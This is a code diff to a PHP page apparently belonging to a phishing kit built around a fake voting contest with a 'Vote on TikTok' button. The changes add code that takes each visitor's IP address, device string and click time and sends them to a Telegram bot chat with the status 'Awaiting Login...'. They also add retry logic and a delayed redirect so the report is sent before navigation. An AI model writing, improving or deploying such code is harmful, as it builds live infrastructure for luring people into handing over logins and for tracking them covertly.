@@ -33,45 +33,80 @@ $contestantsData = include('contestant_config.php');
 $mainContestant = $contestantsData['main_contestant'];
 $otherContestants = $contestantsData['contestants'];
 
-function sendTelegramMessage($botToken, $chatId, $message) {
+// Improved function name and enhanced functionality
+function sendVoteNotificationToTelegram($botToken, $chatId, $message, $retryCount = 3) {
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $data = ['chat_id' => $chatId, 'text' => $message];
+    $data = [
+        'chat_id' => $chatId, 
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
     
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    curl_close($ch);
+    for ($attempt = 1; $attempt <= $retryCount; $attempt++) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($response !== false && $httpCode === 200) {
+            return ['success' => true, 'response' => $response, 'attempt' => $attempt];
+        }
+        
+        if ($attempt < $retryCount) {
+            sleep(1); // Wait 1 second before retry
+        }
+    }
     
-    return $response;
+    return ['success' => false, 'error' => $error ?? 'HTTP Error: ' . $httpCode, 'attempts' => $retryCount];
 }
 
-// Handle vote button click notification with rate limiting
-if (isset($_POST['vote_clicked'])) {
+// Enhanced vote button click handler with better error handling
+function handleVoteButtonClick($botToken, $chatId, $mainContestant) {
     $currentTime = time();
     $rateLimitKey = 'vote_notification_' . session_id();
     $rateLimitDuration = 120; // 2 minutes rate limit
     
     // Check if rate limit exists and is still valid
     if (!isset($_SESSION[$rateLimitKey]) || ($currentTime - $_SESSION[$rateLimitKey]) > $rateLimitDuration) {
-
-        $message = "👤 VOTE BUTTON CLICKED!\n";
-        $message .= "Contestant: " . htmlspecialchars($mainContestant['name']) . "\n";
-        $message .= "Status: Awaiting Login....";
         
+        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+        $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+        $timestamp = date('Y-m-d H:i:s');
         
-        sendTelegramMessage($botToken, $chatId, $message);
+        $message = "🗳️ <b>VOTE BUTTON CLICKED!</b>\n";
+        $message .= "👤 Contestant: <b>" . htmlspecialchars($mainContestant['name']) . "</b>\n";
+        $message .= "⏰ Time: <code>" . $timestamp . "</code>\n";
+        $message .= "🌐 IP: <code>" . $ipAddress . "</code>\n";
+        $message .= "📱 Device: <code>" . substr($userAgent, 0, 50) . "...</code>\n";
+        $message .= "📊 Status: <b>Awaiting Login...</b>";
         
-        // Update rate limit timestamp
-        $_SESSION[$rateLimitKey] = $currentTime;
+        $result = sendVoteNotificationToTelegram($botToken, $chatId, $message);
         
-        echo json_encode(['status' => 'notification_sent']);
+        if ($result['success']) {
+            // Update rate limit timestamp
+            $_SESSION[$rateLimitKey] = $currentTime;
+            return ['status' => 'notification_sent', 'attempt' => $result['attempt']];
+        } else {
+            return ['status' => 'notification_failed', 'error' => $result['error']];
+        }
     } else {
         $timeLeft = $rateLimitDuration - ($currentTime - $_SESSION[$rateLimitKey]);
-        echo json_encode(['status' => 'rate_limited', 'time_left' => $timeLeft]);
+        return ['status' => 'rate_limited', 'time_left' => $timeLeft];
     }
+}
+
+// Handle vote button click notification with improved error handling
+if (isset($_POST['vote_clicked'])) {
+    $result = handleVoteButtonClick($botToken, $chatId, $mainContestant);
+    echo json_encode($result);
     exit();
 }
 
@@ -396,5 +431,149 @@ if ($currentTime > $setDate) {
     </script>
 </body>
 </html>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        var customSelect = document.getElementById("custom-language-select");
+        customSelect.addEventListener("change", function() {
+            var langPair = this.value;
+            doGTranslate(langPair);
+        });
+        
+        // Enhanced vote button click tracking with better user feedback
+        var voteButton = document.getElementById("vote-button");
+        if (voteButton) {
+            voteButton.addEventListener("click", function(e) {
+                // Add visual feedback
+                this.style.opacity = '0.7';
+                this.innerHTML = '<span>Sending notification...</span>';
+                
+                // Send notification to Telegram
+                sendVoteNotification()
+                    .then(data => {
+                        console.log('Notification result:', data);
+                        
+                        // Restore button appearance
+                        restoreVoteButton();
+                        
+                        // Show user feedback based on result
+                        showNotificationFeedback(data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending notification:', error);
+                        restoreVoteButton();
+                        showErrorFeedback('Failed to send notification');
+                    });
+                
+                // Continue with normal link behavior after a short delay
+                setTimeout(() => {
+                    window.location.href = this.href;
+                }, 1500);
+                
+                // Prevent immediate navigation
+                e.preventDefault();
+            });
+        }
+        
+        // Improved notification sending function
+        function sendVoteNotification() {
+            return fetch(window.location.href, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'vote_clicked=1'
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            });
+        }
+        
+        // Function to restore vote button appearance
+        function restoreVoteButton() {
+            var voteButton = document.getElementById("vote-button");
+            if (voteButton) {
+                voteButton.style.opacity = '1';
+                voteButton.innerHTML = `
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16.6 5.82s.51.5 0 0A4.278 4.278 0 0 1 15.54 3h-3.09v12.4a2.592 2.592 0 0 1-2.59 2.5c-1.42 0-2.6-1.16-2.6-2.6 0-1.72 1.66-3.01 3.37-2.48V9.66c-3.45-.46-6.47 2.22-6.47 5.64 0 3.33 2.76 5.7 5.69 5.7 3.14 0 5.69-2.55 5.69-5.69V9.01a7.35 7.35 0 0 0 4.3 1.38V7.3s-1.88.09-3.24-1.48z" fill="white"/>
+                    </svg>
+                    <span>Vote on TikTok</span>
+                `;
+            }
+        }
+        
+        // Function to show notification feedback to user
+        function showNotificationFeedback(data) {
+            let message = '';
+            let bgColor = '';
+            
+            switch(data.status) {
+                case 'notification_sent':
+                    message = '✅ Notification sent successfully!';
+                    bgColor = 'bg-green-500';
+                    break;
+                case 'rate_limited':
+                    message = `⏳ Please wait ${data.time_left} seconds before voting again`;
+                    bgColor = 'bg-yellow-500';
+                    break;
+                case 'notification_failed':
+                    message = '❌ Failed to send notification';
+                    bgColor = 'bg-red-500';
+                    break;
+                default:
+                    message = '📤 Processing your vote...';
+                    bgColor = 'bg-blue-500';
+            }
+            
+            displayToastNotification(message, bgColor);
+        }
+        
+        // Function to show error feedback
+        function showErrorFeedback(message) {
+            displayToastNotification('❌ ' + message, 'bg-red-500');
+        }
+        
+        // Function to display toast notifications
+        function displayToastNotification(message, bgColor) {
+            // Create toast element
+            const toast = document.createElement('div');
+            toast.className = `fixed top-4 right-4 ${bgColor} text-white px-4 py-2 rounded-lg shadow-lg z-50 transform translate-x-full transition-transform duration-300`;
+            toast.textContent = message;
+            
+            // Add to page
+            document.body.appendChild(toast);
+            
+            // Animate in
+            setTimeout(() => {
+                toast.classList.remove('translate-x-full');
+            }, 100);
+            
+            // Remove after 3 seconds
+            setTimeout(() => {
+                toast.classList.add('translate-x-full');
+                setTimeout(() => {
+                    document.body.removeChild(toast);
+                }, 300);
+            }, 3000);
+        }
+    });
+    
+    function doGTranslate(langPair) {
+        if (!langPair) return;
+        var lang = langPair.split('|')[1];
+        var gtCombo = document.querySelector('.goog-te-combo');
+        if (gtCombo) {
+            gtCombo.value = lang;
+            var event = document.createEvent("HTMLEvents");
+            event.initEvent("change", true, true);
+            gtCombo.dispatchEvent(event);
+        }
+    }
+</script>
+
 
 
